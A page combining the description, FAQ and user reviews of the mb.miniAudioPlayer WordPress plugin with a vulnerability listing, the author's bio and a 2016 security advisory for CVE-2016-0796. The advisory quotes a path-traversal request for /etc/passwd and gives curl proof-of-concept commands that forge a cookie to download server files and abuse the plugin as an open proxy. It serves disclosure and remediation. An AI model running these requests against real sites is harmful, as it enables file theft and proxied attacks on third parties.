# mb.miniAudioPlayer – an HTML5 audio player for your mp3 files

## Description

**This plug-in let you transform any mp3 file uploaded inside a post into an essential small HTML5 audio player with:**

* volume control
* seeking control
* title bar
* rewind button
* mute button
* play button

**Watch this video to learn how to customize your player using the on line Skin Maker too:**

**Important!**

From version 1.5.8 the CSS has been changed; for all the one how have customized the skin they need to recreate their skin from [here](http://pupunzi.com/mb.components/mb.miniAudioPlayer/demo/skinMaker.html).

Links:

* demo: http://pupunzi.com/mb.components/mb.miniAudioPlayer/demo/demo.html
* video: http://youtu.be/B8Dr4aUNGgo
* pupunzi blog: http://pupunzi.open-lab.com
* pupunzi site: http://pupunzi.com

From version 1.4.x you can customize your player appearance by using the [on-line miniAudioPlayer Skin Editor](http://pupunzi.com/mb.components/mb.miniAudioPlayer/demo/skinMaker.html).

If you are using others HTML5 audio plugins (like Haiku) there could be conflicts with mb.miniAudioPlayer. You should deactivete the others befor using it.

Other WP plugins:

* **wp-YTPlayer.** A Chromeless video player to play your Youtube videos as background of any WP page or post.

  https://wordpress.org/extend/plugins/wpmbytplayer/

### How it works:

1. Activate the mb.miniAudioPlayer plugin via the WP plugin panel;
2. Edit a post or a page, click on the Upload/Insert media link and choose an mp3 file;
3. place it into the post wherever you want to show the player.
4. save the post and browse it; the player will show instead of the link at the file.

to change the player default settings go to the mb.miniAudioPlayer settings panel (you can find it under the “settings” section of the WP backend).

**Options:**

* @ width = (int) the width in pixel of the player once opened.
* @ skin = the color of the player interface (black, blue, orange, red, gray and green).
* @ volume = (int) the initial volume of the player.
* @ showVolumeLevel = a boolean to show or hide the volume control.
* @ showTime = a boolean to show or hide the time counter.
* @ showRew = a boolean to show or hide the rewind control.
* @ autoPlay = (available only for the TinyMCE editor plugin) a boolean to set in play the player once the page is loaded.
* @ downloadable = a boolean to show the download button next to the player.
* @ excluded = a string containing the CSS class for audio links that should not be converted into player.

**Ubuntu Chromium issue**

Due to some codecs missing in the default Ubuntu Chromium install the player will not work. This problem can be resolved by simply installing that codecs via console:

sudo apt-get-install chromium-codecs-ffmpeg-extra

After that your player should work fine.

## Installation

Extract the zip file and upload the contents to the wp-content/plugins/ directory of your WordPress® installation, and then activate the plugin from the plugins page.

## FAQ

### I installed the plugin and the players are correctly displayed but the customization button doesn’t show in the post editor

You have to check the “Activate the player customizer in the post editor” to make it available in the post editor.

### I inserted my mp3 file using the add media button but even when I select or click on the inserted link the customization button is disabled

Be sure that once you inserted the file you set the “Attachment Display Settings -> Link” to “media file” in the media file window.

### I installed the plugin and now I can’t display the post editor in “visual” mode anymore

This is probably due to insufficient user permissions on your server that cause an error loading the TinyMCE mb.miniAudioPlayer component. You should try download the component locally on your computer, unzip it and upload the folder via FTP in the remote plugins folder.

### I installed the plugin but on the page there’s only the link to the mp3 file and not the player

Probably there’s a conflict with some other installed plugin or even with the theme you are using.

Try first deactivating all the other plugins; if it works then reactivate them one by one to find out which is getting in conflict; if it doesn’t work then there’s a conflict with your theme.

### The player is working fine but it display differently from the examples you gave

The appearance of the player is all defined in the “miniplayer.css” file located in the “css” folder of the plugin root. You maybe have some CSS classes that are overwriting the plugin ones.

You can inspect the player using the developer tools within the browser to find out which class is overwritten and fix the problem changing the theme css.

### It doesn’t work on Firefox and neither on IE, what is the problem?

On both those browsers the player falls back to the Flash® solution instead of the standard HTML5; That because FF doesn’t accept mp3 files natively and IE is a mess :-).

So if the player doesn’t work on them probably is your Flash plugin that is not update or is not working correctly.

### It doesn’t work on Ubuntu Chromium

Due to some codecs missing in the default Ubuntu Chromium install the player will not work. This problem can be resolved by simply by installing that codecs via console:

sudo apt-get-install chromium-codecs-ffmpeg-extra.

After that your player should work fine.

### I can’t display the download button on touch devices

The download button is intentionally removed on touch devices as it is impossible to download the file on that devices.

I use for music reproduction in the article for a long time.
I like it because it looks a lot better than the default player. I hope this plugin is maintained for a long time.

mb.miniAudioPlayer is working great. Thanks!
I have been using MP3-jPlayer for years but with the update to WordPress 5.5, a migration tool known as jquery-migrate was no longer enabled by default. Then with the update to WordPress 5.6, the included version of jQuery was also upgraded. This means that old code that previously caused warnings may now, instead, cause errors or stop working entirely. Consequently I was getting white screens of death and fatal errors and I was losing customers as a result.
After hours of research and problem solving I am so pleased to say that switching over to mb.miniAudioPlayer immediately stopped the issues and my site is now working well again.

I used this to replace the default player to look nicer and allow download of mp3’s – does both fantastically.
Been using for a year or more and never an issue.

# WordPress Plugin mb.miniAudioPlayer-an HTML5 audio player for your mp3 files Multiple Vulnerabilities (1.7.6)

## Description

WordPress Plugin mb.miniAudioPlayer-an HTML5 audio player for your mp3 files is prone to multiple vulnerabilities, including open proxy and security bypass vulnerabilities because it fails to properly verify user-supplied input. An attacker may leverage these issues to hide attacks directed at a target site from behind vulnerable website or to perform otherwise restricted actions and subsequently download files with the extension mp3, mp4a, wav and ogg from anywhere the web server application has read access to the system. WordPress Plugin mb.miniAudioPlayer-an HTML5 audio player for your mp3 files version 1.7.6 is vulnerable; prior versions may also be affected.

## Remediation

Edit the source code to ensure that input is properly verified or disable the plugin until a fix is available

### Bio

I’m Matteo Bicocchi, a Graphic designer and a creative code developer.

Co-founder of Open Lab, a polyhedral communication/software/design company located in Florence, Italy.

I love experimenting on interfaces and graphic.

I love creativity and I believe that knowledge is nothing without imagination.

My graphic design experience started 26 years ago at Hopeful Monster ed., a small publishing company founded by my parents. I worked there as graphic designer, making Contemporary Art catalogs and epistemology / science of philosophy books (when books were made by hand). My web developer experience started 16 years ago, when the web was blooming.

In 2001 I founded Open Lab. Now we are focused on developing both high level websites and applied games built on C# using Unity3D as the development framework. We are the creator of Football Drama.

| Advisory #: 162 |

| **Title:** Open Proxy & Authentication by pass for wordpress plugin wp-miniaudioplayer v1.7.6 |
| **Author:** Larry W. Cashdollar, @\_larry0 |
| **Date:** 2016-02-01 |
| **CVE-ID:**[[CVE-2016-0796](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0796)] |
| **CWE:** |
| **Download Site:** <https://wordpress.org/plugins/wp-miniaudioplayer> |
| **Vendor:**  https://profiles.wordpress.org/pupunzi/ |
| **Vendor Notified:**  2016-02-12 |
| **Vendor Contact:** @pupunzi |
| **Advisory:** <http://www.vapidlabs.com/advisory.php?v=162> |
| **Description:** Transform your mp3 audio files into a nice, small light HTML5 player. |
| **Vulnerability:**The code in map\_download.php was improperly patched to fix an LFI vulnerability reported here: http://0day.today/exploit/24536 That POC was: http://victim.com/wp-content/plugins/wp-miniaudioplayer/map\_download.php?fi leurl=/etc/passwd The fix had faulty authentication code in map\_download.php that can easily be bypassed by setting The required cookie: 8 if(!isset($\_COOKIE["mapdownload"]) || $\_COOKIE["mapdownload"] !== "true") 9 die ($\_COOKIE["mapdownload"].' <b>Something goes wrong, you don\'t have permission to use this page, sorry.</b>') ; A vulnerable installation of this plugin can be used to download files with the extension mp3,mp4a,wav and ogg from any where the web server application has read access to the system: PoC 1: $ curl "http://wpsite/wp-content/plugins/wp-miniaudioplayer/map\_download.php?fileu rl=/tmp/s3kr3t\_audio\_file.mp3" --cookie "mapdownload=true” I also noticed with the use of fopen() you have the ability to also fetch URLs which would allow a malicious person to use this plugin as a blind proxy. You could download mp3’s through it or use it to proxy attacks via HTTP GET requests. Since the code to check the file extension is done after the request is made you can get two Request to the target server regardless of the file extension restrictions: $ curl "http://192.168.0.2/wp-content/plugins/wp-miniaudioplayer/map\_download.php? fileurl=http://192.168.0.3/tee".php" --cookie "mapdownload=true 192.168.0.2 - - [02/Feb/2016:21:52:32 -0500] "GET /test.php HTTP/1.0" 200 187 "-" "-" 192.168.0.2 - - [02/Feb/2016:21:52:32 -0500] "GET /test.php HTTP/1.0" 200 187 "-" "-" So 2x DoS amplification, the first is to check if the file exists and the second is to finally read data from the file. |
| **Export:** [JSON](export_mitre_v4.py?id=162) [TEXT](txt.php?v=162) [XML](xml.php?s=162) |
| **Exploit Code:** ```   1. curl "http://wpsite/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=/tmp/s3kr3t_audio_file.mp3"  --cookie "mapdownload=true” 2. curl "http://192.168.0.2/wp-content/plugins/wp-miniaudioplayer/map_download.php? fileurl=http://192.168.0.3/tee".php"  --cookie "mapdownload=true  ``` |
